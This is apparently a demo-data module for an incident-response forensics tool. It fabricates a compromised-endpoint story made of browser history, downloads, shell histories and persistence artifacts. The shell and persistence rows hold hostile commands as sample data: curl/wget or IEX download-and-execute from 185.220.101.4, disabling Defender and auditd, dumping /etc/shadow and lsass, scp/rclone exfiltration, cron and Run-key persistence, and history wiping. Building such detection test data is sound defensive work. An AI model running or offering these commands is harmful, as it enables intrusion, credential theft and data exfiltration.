/*
 * ============================================================================
 * DEMO DATASET — incident response scenario "Compromised endpoint"
 * ============================================================================
 *
 * Populates the active browser with consistent data (per-browser SPEC model)
 * to test ALL features with a single click:
 *   - history with normal visits, SEARCHES (known engines) and REDIRECTS (chain
 *     link → .onion hidden service) to show the link to the redirect;
 *   - DOWNLOADS (date, file name, originating site, size), including files
 *     downloaded from suspicious channels at night;
 *   - activity outside business hours (nighttime) → anomaly highlighting;
 *   - suspicious keywords (pastebin, mega.nz, .onion, exploit, bypass…);
 *   - bookmarks and shortcuts (the latter only for Chromium browsers).
 *
 * Timestamps are relative to Date.now() (last ~30 days).
 */

import { generateId } from '../utils/id.js'

const MS_PER_DAY = 24 * 60 * 60 * 1000

/** Timestamp (Unix ms): `daysAgo` days ago, at local time hour:minute. */
function daysAgoAt(daysAgo, hour, minute = 0) {
  const base = new Date(Date.now() - daysAgo * MS_PER_DAY)
  base.setHours(hour, minute, 0, 0)
  return base.getTime()
}

/* -------------------------------------------------------------------------- */
/* HISTORY                                                                     */
/* -------------------------------------------------------------------------- */

/*
 * Each row: [daysAgo, hour, minute, url, title, visitCount, extra?]
 * `extra` (optional): { visitId, fromVisitId, isRedirect } to build the
 * demonstration redirect chains.
 */
const HISTORY_ROWS = [
  /* --- Normal daytime traffic --- */
  [0, 9, 12, 'https://github.com/company/incident-response', 'company/incident-response · GitHub', 42],
  [0, 9, 31, 'https://stackoverflow.com/questions/1234567/parse-sqlite-in-browser', 'javascript - Parse SQLite in browser - Stack Overflow', 27],
  [0, 10, 3, 'https://developer.mozilla.org/it/docs/Web/API/File', 'File - Web API | MDN', 18],
  [0, 11, 45, 'https://mail.google.com/mail/u/0/', 'Inbox - Gmail', 88],
  [1, 8, 52, 'https://github.com/company/soc-playbooks', 'company/soc-playbooks · GitHub', 35],
  [1, 14, 20, 'https://www.google.com/search?q=chrome+history+forensics+sqlite', 'chrome history forensics sqlite - Google Search', 6],
  [1, 14, 22, 'https://www.forensicfocus.com/articles/chrome-history-analysis/', 'Chrome History Analysis - Forensic Focus', 4],
  [2, 10, 15, 'https://stackoverflow.com/questions/7654321/react-table-pagination', 'reactjs - React table pagination - Stack Overflow', 22],
  [2, 16, 40, 'https://news.ycombinator.com/', 'Hacker News', 51],
  [3, 9, 5, 'https://intranet.company.local/dashboard', 'Corporate dashboard', 64],
  [3, 15, 33, 'https://www.linkedin.com/feed/', 'LinkedIn', 40],
  [6, 10, 48, 'https://attack.mitre.org/techniques/T1059/', 'Command and Scripting Interpreter, T1059 - MITRE ATT&CK', 9],

  /* --- Repeated suspicious searches (feeds the "frequent searches" widget) --- */
  [2, 2, 14, 'https://www.google.com/search?q=how+to+bypass+windows+defender', 'how to bypass windows defender - Google Search', 5],
  [2, 2, 19, 'https://www.google.com/search?q=how+to+bypass+windows+defender', 'how to bypass windows defender - Google Search', 5],
  [4, 3, 2, 'https://www.google.com/search?q=how+to+bypass+windows+defender', 'how to bypass windows defender - Google Search', 5],
  [2, 2, 27, 'https://www.google.com/search?q=malware+builder+download', 'malware builder download - Google Search', 4],
  [4, 3, 8, 'https://www.google.com/search?q=malware+builder+download', 'malware builder download - Google Search', 4],

  /* --- REDIRECT chain: shortened link → .onion hidden service --- */
  [3, 1, 40, 'https://bit.ly/xY9zK', 'bit.ly', 1, { visitId: 9001, fromVisitId: null, isRedirect: false }],
  [3, 1, 41, 'http://exfil7g2x4qh6vpn.onion/upload', 'Dropzone (Tor hidden service)', 4, { visitId: 9002, fromVisitId: 9001, isRedirect: true }],

  /* --- Other suspicious nighttime visits (keywords) --- */
  [2, 2, 33, 'https://www.exploit-db.com/exploits/50123', 'Windows Defender Bypass - Exploit Database', 3],
  [2, 2, 51, 'https://pastebin.com/raw/aB3xK9mZ', 'Pastebin.com - raw payload', 7],
  [4, 3, 22, 'https://www.torproject.org/download/', 'Download Tor Browser', 2],

  /* --- Scattered normal traffic (fills the timeline) --- */
  [8, 10, 30, 'https://www.google.com/search?q=tailwind+css+dark+mode', 'tailwind css dark mode - Google Search', 11],
  [8, 10, 34, 'https://tailwindcss.com/docs/dark-mode', 'Dark Mode - Tailwind CSS', 15],
  [9, 14, 12, 'https://react.dev/reference/react/useMemo', 'useMemo – React', 19],
  [11, 16, 5, 'https://www.reddit.com/r/netsec/', 'r/netsec', 28],
  [13, 10, 20, 'https://www.virustotal.com/gui/home/upload', 'VirusTotal', 17],
  [14, 15, 15, 'https://www.google.com/search?q=incident+response+checklist', 'incident response checklist - Google Search', 7],
  [18, 13, 8, 'https://news.ycombinator.com/', 'Hacker News', 51],
  [21, 10, 25, 'https://mail.google.com/mail/u/0/', 'Inbox - Gmail', 88],
  [27, 11, 3, 'https://developer.mozilla.org/it/docs/Web/API/IndexedDB_API', 'IndexedDB API - Web API | MDN', 9],
  [29, 16, 30, 'https://github.com/company/incident-response', 'company/incident-response · GitHub', 42],
]

function buildDemoHistory() {
  return HISTORY_ROWS.map(([daysAgo, hour, minute, url, title, visitCount, extra], index) => ({
    id: generateId(),
    url,
    title,
    visitCount,
    visitTime: daysAgoAt(daysAgo, hour, minute),
    visitId: extra?.visitId ?? 5000 + index,
    fromVisitId: extra?.fromVisitId ?? null,
    isRedirect: extra?.isRedirect ?? false,
  }))
}

/* -------------------------------------------------------------------------- */
/* DOWNLOADS                                                                   */
/* -------------------------------------------------------------------------- */

// [daysAgo, hour, minute, fileName, referrerSite, fileUrl, totalBytes]
const DOWNLOAD_ROWS = [
  [0, 10, 5, 'incident-report-template.docx', 'https://intranet.company.local', 'https://intranet.company.local/files/incident-report-template.docx', 84_000],
  [1, 9, 40, 'Sysmon.zip', 'https://learn.microsoft.com', 'https://download.sysinternals.com/files/Sysmon.zip', 3_600_000],
  [5, 14, 12, 'wireshark-4.2.0-x64.exe', 'https://www.wireshark.org', 'https://2.na.dl.wireshark.org/win64/wireshark-4.2.0-x64.exe', 78_500_000],
  /* --- Suspicious nighttime downloads --- */
  [2, 2, 55, 'payload.bin', 'https://pastebin.com', 'https://pastebin.com/raw/aB3xK9mZ', 512_000],
  [3, 1, 15, 'toolkit.zip', 'https://mega.nz', 'https://mega.nz/file/Abc123', 24_000_000],
  [2, 2, 40, 'defender-bypass.ps1', 'https://www.exploit-db.com', 'https://www.exploit-db.com/download/50123', 12_400],
  [6, 4, 15, 'dump.zip', 'https://transfer.sh', 'https://transfer.sh/get/xY7z/dump.zip', 156_000_000],
]

function buildDemoDownloads() {
  return DOWNLOAD_ROWS.map(([daysAgo, hour, minute, fileName, referrer, url, totalBytes]) => ({
    id: generateId(),
    fileName,
    targetPath: `C:\\Users\\analyst\\Downloads\\${fileName}`,
    url,
    referrer,
    startTime: daysAgoAt(daysAgo, hour, minute),
    endTime: daysAgoAt(daysAgo, hour, minute + 1),
    totalBytes,
    receivedBytes: totalBytes,
    mimeType: '',
    state: 1,
  }))
}

/* -------------------------------------------------------------------------- */
/* BOOKMARKS                                                                   */
/* -------------------------------------------------------------------------- */

const BOOKMARK_ROWS = [
  [30, 'Incident Response - Repo', 'https://github.com/company/incident-response', 'Bookmarks bar > Work'],
  [30, 'SOC Playbooks', 'https://github.com/company/soc-playbooks', 'Bookmarks bar > Work'],
  [28, 'MITRE ATT&CK', 'https://attack.mitre.org/', 'Bookmarks bar > Resources'],
  [28, 'VirusTotal', 'https://www.virustotal.com/', 'Bookmarks bar > Resources'],
  [25, 'Forensic Focus', 'https://www.forensicfocus.com/', 'Bookmarks bar > Resources'],
  [20, 'Corporate dashboard', 'https://intranet.company.local/dashboard', 'Bookmarks bar'],
  [7, 'Exploit Database', 'https://www.exploit-db.com/', 'Other bookmarks > _tmp'],
  [6, 'Pastebin (payloads)', 'https://pastebin.com/u/anon0x', 'Other bookmarks > _tmp'],
  [5, 'Tor Project', 'https://www.torproject.org/', 'Other bookmarks > _tmp'],
]

function buildDemoBookmarks() {
  return BOOKMARK_ROWS.map(([daysAgo, name, url, folder]) => ({
    id: generateId(),
    name,
    url,
    folder,
    dateAdded: daysAgoAt(daysAgo, 12, 0),
  }))
}

/* -------------------------------------------------------------------------- */
/* SHORTCUTS (Chromium only)                                                   */
/* -------------------------------------------------------------------------- */

const SHORTCUT_ROWS = [
  [0, 9, 'github', 'https://github.com/company/incident-response', 'company/incident-response · GitHub', 40],
  [0, 11, 'gmail', 'https://mail.google.com/mail/u/0/', 'Inbox - Gmail', 85],
  [1, 14, 'dashboard', 'https://intranet.company.local/dashboard', 'Corporate dashboard', 60],
  [2, 16, 'stack', 'https://stackoverflow.com/', 'Stack Overflow', 22],
  [3, 10, 'mitre', 'https://attack.mitre.org/', 'MITRE ATT&CK', 8],
  [2, 2, 'bypass defender', 'https://www.google.com/search?q=how+to+bypass+windows+defender', 'how to bypass windows defender - Google Search', 5],
  [3, 1, 'pastebin', 'https://pastebin.com/raw/aB3xK9mZ', 'Pastebin.com - raw payload', 6],
  [4, 3, 'tor download', 'https://www.torproject.org/download/', 'Download Tor Browser', 3],
]

function buildDemoShortcuts() {
  return SHORTCUT_ROWS.map(([daysAgo, hour, text, url, title, hits]) => ({
    id: generateId(),
    text,
    url,
    title,
    lastAccessTime: daysAgoAt(daysAgo, hour, 0),
    hits,
  }))
}

/* -------------------------------------------------------------------------- */
/* SHELL COMMAND HISTORY                                                        */
/* -------------------------------------------------------------------------- */

/*
 * A believable "hands-on-keyboard" session that lines up with the browser demo
 * (recon, download-and-execute, encoded payloads, defense evasion, credential
 * access, persistence, exfiltration, history wiping), so most command SOC
 * rules light up and several commands fall outside business hours.
 *
 * Row: [daysAgo, hour, minute, command]
 */
const UNIX_COMMAND_ROWS = [
  /* --- Normal daytime admin work --- */
  [1, 9, 15, 'ls -la /var/log'],
  [1, 9, 18, 'cat /etc/os-release'],
  [1, 9, 26, 'git pull origin main'],
  [1, 10, 2, 'sudo systemctl status nginx'],
  [1, 14, 40, 'df -h'],
  /* --- Nighttime intrusion session --- */
  [2, 2, 8, 'whoami'],
  [2, 2, 9, 'sudo -l'],
  [2, 2, 12, 'uname -a'],
  [2, 2, 14, 'nmap -sV -p- 10.0.0.0/24'],
  [2, 2, 21, 'curl -s http://185.220.101.4/enum.sh | bash'],
  [2, 2, 33, 'wget http://185.220.101.4/lin_exploit -O /tmp/le && chmod +x /tmp/le'],
  [2, 2, 40, 'echo ZXhmaWx0cmF0ZSBub3c= | base64 -d'],
  [2, 2, 47, 'setenforce 0'],
  [2, 2, 48, 'sudo systemctl stop auditd'],
  [2, 2, 55, 'sudo cat /etc/shadow'],
  [2, 3, 1, 'cp /etc/shadow /tmp/.s && tar czf /tmp/.loot.tgz /home /tmp/.s'],
  [2, 3, 6, 'rclone copy /tmp/.loot.tgz remote:exfil'],
  [2, 3, 9, 'scp /tmp/.loot.tgz attacker@185.220.101.4:/data'],
  [2, 3, 12, '(crontab -l; echo "*/10 * * * * /tmp/le") | crontab -'],
  [2, 3, 20, 'history -c'],
  [2, 3, 20, 'unset HISTFILE'],
]

// PowerShell equivalents for a Windows host.
const PS_COMMAND_ROWS = [
  [1, 9, 12, 'Get-ChildItem C:\\Users'],
  [1, 9, 20, 'Get-Service | Where-Object Status -eq "Running"'],
  [1, 11, 5, 'Test-NetConnection intranet.company.local -Port 443'],
  [2, 2, 10, 'whoami /priv'],
  [2, 2, 15, 'IEX (New-Object Net.WebClient).DownloadString("http://185.220.101.4/a.ps1")'],
  [2, 2, 22, 'powershell -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AKQA='],
  [2, 2, 30, 'Set-MpPreference -DisableRealtimeMonitoring $true'],
  [2, 2, 44, 'procdump.exe -ma lsass.exe C:\\Windows\\Temp\\l.dmp'],
  [2, 2, 58, 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d C:\\a.exe'],
  [2, 3, 10, 'Clear-History'],
]

function buildDemoCommands(rows) {
  return rows.map(([daysAgo, hour, minute, command], index) => ({
    id: generateId(),
    command,
    time: daysAgoAt(daysAgo, hour, minute),
    lineNo: index + 1,
  }))
}

/* -------------------------------------------------------------------------- */
/* ENDPOINT ARTIFACTS (per category, OS-aware)                                 */
/* -------------------------------------------------------------------------- */

/*
 * Demo records mirror the browser/command intrusion story: a legit-looking
 * baseline plus malicious rows (temp execution, LOLBins, offensive tools,
 * suspicious persistence, USB exfiltration) that trip the artifact rules and
 * fall outside business hours. Each generator returns rows shaped like the
 * category's fields, with a Unix-ms `time`.
 */

function demoExecution(os) {
  const win = [
    [1, 9, 20, 'chrome.exe', 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 214, 'Prefetch'],
    [1, 10, 2, 'Code.exe', 'C:\\Users\\analyst\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe', 88, 'Amcache'],
    [2, 2, 33, 'le.exe', 'C:\\Users\\analyst\\AppData\\Local\\Temp\\le.exe', 3, 'Prefetch'],
    [2, 2, 41, 'mimikatz.exe', 'C:\\Windows\\Temp\\mimikatz.exe', 1, 'Amcache'],
    [2, 2, 52, 'rundll32.exe', 'C:\\Windows\\System32\\rundll32.exe C:\\Users\\analyst\\Downloads\\evil.dll,Start', 2, 'ShimCache'],
    [2, 3, 4, 'procdump.exe', 'C:\\Windows\\Temp\\procdump.exe', 1, 'Prefetch'],
  ]
  const nix = [
    [1, 9, 15, 'bash', '/usr/bin/bash', 402, 'auditd'],
    [1, 11, 5, 'python3', '/usr/bin/python3', 57, 'auditd'],
    [2, 2, 21, 'enum.sh', '/tmp/enum.sh', 1, 'auditd'],
    [2, 2, 34, 'le', '/tmp/le', 4, 'auditd'],
    [2, 2, 55, 'linpeas.sh', '/dev/shm/linpeas.sh', 1, 'auditd'],
    [2, 3, 8, 'rclone', '/home/analyst/.cache/rclone', 2, 'auditd'],
  ]
  const rows = os === 'windows' ? win : nix
  return rows.map(([d, h, m, name, path, runCount, source]) => ({
    id: generateId(),
    time: daysAgoAt(d, h, m),
    fields: { name, path, runCount: String(runCount), source },
  }))
}

function demoPersistence(os) {
  const win = [
    [10, 8, 0, 'OneDrive', 'Run key', 'C:\\Users\\analyst\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe /background', 'HKCU\\...\\Run'],
    [2, 2, 58, 'Updater', 'Run key', 'C:\\Users\\analyst\\AppData\\Roaming\\a.exe', 'HKCU\\...\\Run'],
    [2, 3, 12, 'SystemHealth', 'Scheduled Task', 'C:\\Windows\\Temp\\le.exe', 'C:\\Windows\\System32\\Tasks\\SystemHealth'],
    [2, 3, 15, 'WinDefendSvc', 'Service', 'C:\\Users\\analyst\\AppData\\Roaming\\svc.exe', 'SYSTEM\\...\\Services'],
  ]
  const nix = [
    [12, 9, 0, 'docker', 'systemd unit', '/usr/bin/dockerd', '/etc/systemd/system/docker.service'],
    [2, 3, 12, 'cron-update', 'cron', '*/10 * * * * /tmp/le', '/var/spool/cron/analyst'],
    [2, 3, 14, 'ssh-key', 'authorized_keys', 'ssh-ed25519 AAAA...attacker', '~/.ssh/authorized_keys'],
    [2, 3, 18, 'bashrc-hook', 'shell rc', 'curl -s http://185.220.101.4/b.sh | bash', '~/.bashrc'],
  ]
  const rows = os === 'windows' ? win : nix
  return rows.map(([d, h, m, name, kind, command, location]) => ({
    id: generateId(),
    time: daysAgoAt(d, h, m),
    fields: { name, kind, command, location },
  }))
}

function demoFileAccess(os) {
  const win = [
    [1, 9, 30, 'incident-report.docx', 'C:\\Users\\analyst\\Documents\\incident-report.docx', 'LNK'],
    [1, 14, 12, 'budget-2024.xlsx', '\\\\fileserver\\finance\\budget-2024.xlsx', 'JumpList'],
    [2, 2, 50, 'passwords.kdbx', 'C:\\Users\\analyst\\Documents\\passwords.kdbx', 'RecentDocs'],
    [2, 3, 2, 'loot.7z', 'E:\\loot.7z', 'LNK'],
    [2, 3, 5, 'exfil', 'E:\\exfil\\', 'ShellBag'],
  ]
  const nix = [
    [1, 9, 30, 'incident-report.odt', '/home/analyst/Documents/incident-report.odt', 'recently-used'],
    [2, 2, 50, 'id_rsa', '/home/analyst/.ssh/id_rsa', 'recently-used'],
    [2, 3, 2, 'loot.tar.gz', '/media/analyst/USB/loot.tar.gz', 'recently-used'],
    [2, 3, 5, 'shadow.bak', '/tmp/shadow.bak', 'recently-used'],
  ]
  const rows = os === 'windows' ? win : nix
  return rows.map(([d, h, m, name, target, kind]) => ({
    id: generateId(),
    time: daysAgoAt(d, h, m),
    fields: { name, target, kind },
  }))
}

function demoUsb() {
  const rows = [
    [40, 10, 0, 'Kingston DataTraveler 3.0', '408D5C0E1F2A', 'Kingston / DT101', 'First connected'],
    [2, 2, 48, 'SanDisk Ultra USB 3.0', 'AA010203BEEF', 'SanDisk / Ultra', 'First connected'],
    [2, 3, 6, 'SanDisk Ultra USB 3.0', 'AA010203BEEF', 'SanDisk / Ultra', 'Last connected'],
  ]
  return rows.map(([d, h, m, device, serial, vendor, connection]) => ({
    id: generateId(),
    time: daysAgoAt(d, h, m),
    fields: { device, serial, vendor, connection },
  }))
}

const DEMO_BY_CATEGORY = {
  execution: demoExecution,
  persistence: demoPersistence,
  fileaccess: demoFileAccess,
  usb: (os) => demoUsb(os),
}

/* -------------------------------------------------------------------------- */
/* API                                                                         */
/* -------------------------------------------------------------------------- */

/**
 * Demonstration dataset for a browser. Shortcuts are included only if the
 * browser supports them (Chromium engine); Firefox does not have them.
 * @param {object} browser browser definition (from config/browsers.js)
 * @returns {{ history, downloads, bookmarks, shortcuts }}
 */
export function getDemoBrowserData(browser) {
  const supportsShortcuts = browser?.artifacts?.includes('shortcuts')
  return {
    history: buildDemoHistory(),
    downloads: buildDemoDownloads(),
    bookmarks: buildDemoBookmarks(),
    shortcuts: supportsShortcuts ? buildDemoShortcuts() : [],
  }
}

/**
 * Demonstration command history for a shell: PowerShell gets Windows-style
 * commands, the POSIX shells share the Unix session.
 * @param {object} shell shell definition (from config/shells.js)
 * @returns {{ commands: Array }}
 */
export function getDemoShellData(shell) {
  const rows = shell?.format === 'psreadline' ? PS_COMMAND_ROWS : UNIX_COMMAND_ROWS
  return { commands: buildDemoCommands(rows) }
}

/**
 * Demonstration records for an endpoint artifact category, tailored to the
 * host OS (Windows paths vs. POSIX paths).
 * @param {object} category category definition (from config/artifacts.js)
 * @param {string} os host OS id ('windows' | 'macos' | 'linux')
 * @returns {{ records: Array }}
 */
export function getDemoArtifactData(category, os = 'windows') {
  const generator = DEMO_BY_CATEGORY[category?.id]
  // macOS reuses the POSIX-flavored rows.
  const osKey = os === 'windows' ? 'windows' : 'linux'
  return { records: generator ? generator(osKey) : [] }
}
